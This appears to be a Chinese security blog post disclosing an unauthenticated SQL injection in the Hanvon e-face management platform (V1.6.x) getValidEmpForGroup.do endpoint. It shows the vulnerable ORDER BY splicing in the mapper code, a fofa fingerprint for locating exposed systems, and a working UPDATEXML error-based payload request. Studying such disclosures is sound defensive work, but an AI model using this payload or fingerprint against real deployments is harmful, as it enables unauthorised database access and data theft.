---
title: "汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getvalidempforgroup.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/10 08:28
* 921浏览
* [0评论](#comment)
* 45分钟阅读

深入探索

计算机安全

鉴权

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getValidEmpForGroup.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

技术文章订阅

网络安全会议

漏洞修复方案

直接看 `AuthMultiplePeopleOpenController` 里关于 `getValidEmpForGroup` 的实现

```
public RequestJson getValidEmpForGroup(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) Long groupId, @RequestParam(value = "idsNotIn[]",required = false) Integer[] idsNotIn, @RequestParam(value = "fields[]",required = false) Integer[] fields, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        EmployeeGroupParam employeeGroupParam = new EmployeeGroupParam();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != key) {
                employeeGroupParam.setKey(key);
            }

            if (null != departmentId) {
                employeeGroupParam.setDepartmentId(departmentId);
            }

            if (null != groupId) {
                employeeGroupParam.setGroupId(groupId);
            }

            if (fields != null && fields.length > 0) {
                employeeGroupParam.setFields(fields);
            }

            employeeGroupParam.setOrder(order);
            employeeGroupParam.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            List<EmployeeGroupEmployee> eges = this.authMultiplePeopleOpenAsm.selectValidPerson(employeeGroupParam, idsNotIn);
            PageInfo<EmployeeGroupEmployee> info = new PageInfo(eges);
```

深入探索

身份验证

数据库

SQL

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccesManyPeopleGroupDao.xml

代码安全审计

```
<select id="selectValidPerson" resultType="com.hanvon.iface.tpm.access.EmployeeGroupEmployee">
    select EI.NG_ID id,EI.SZ_EMPLOY_ID AS attendanceCode,EI.SZ_NAME NAME,EI.NT_GENDER SEX,EI.SZ_TELEPHONE PHONE, ED.NG_ID AS departmentId, ED.SZ_NAME AS departmentName
    from SYS_USER EI
    left join sys_user_branch sub on sub.ng_user_id = EI.NG_ID
    left join SYS_BRANCH ED on ED.NG_ID=sub.NG_BRANCH_ID
    where EI.NT_USER_STATE = 1  and
    EI.NG_ID not in (select EMPLOYEE_ID from ACCESS_MANY_GROUP_EMPLOYEE AMGE WHERE AMGE.GROUP_ID=#{groupId})
    <if test="idsNotIn != null">
      AND EI.NG_ID not in
      <foreach close=")" collection="idsNotIn" index="index" item="item" open="(" separator=",">
        #{item}
      </foreach>
    </if>
    <if test="departmentId != null">
      AND ED.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    <if test="key != null and key != ''">
      and ( EI.SZ_NAME like concat("%", #{key},"%")
      or  EI.SZ_EMPLOY_ID like concat("%", #{key},"%")
      or  EI.SZ_TELEPHONE like concat("%", #{key},"%")
      or  EI.SZ_MOBILE like concat("%", #{key},"%"))
    </if>
    <if test="fields != null">
      AND (
      <foreach close="" collection="fields" index="index" item="item" open="" separator=" or ">
        find_in_set(#{item},FIELDS)
      </foreach>
      )
    </if>
    order by
    <if test="order == null or order == ''">
      EI.SZ_EMPLOY_ID + 0 asc
    </if>
    <if test="order != null and order != ''">
      <if test="columnKey == 'attendanceCode' or columnKey == 'ATTENDANCE_CODE'">
        EI.SZ_EMPLOY_ID + 0 ${order}
      </if>
      <if test="columnKey != 'attendanceCode' and columnKey != 'ATTENDANCE_CODE'">
        ${columnKey} ${order}
      </if>
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/authMultiplePeople/getValidEmpForGroup.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞](images/img-001-d1f3b03d414e.webp)](https://image.mrxn.net/dbfe44f2f539440b81fc1ea57bca5b5f.webp)

成功利用报错注入获取到数据版本号

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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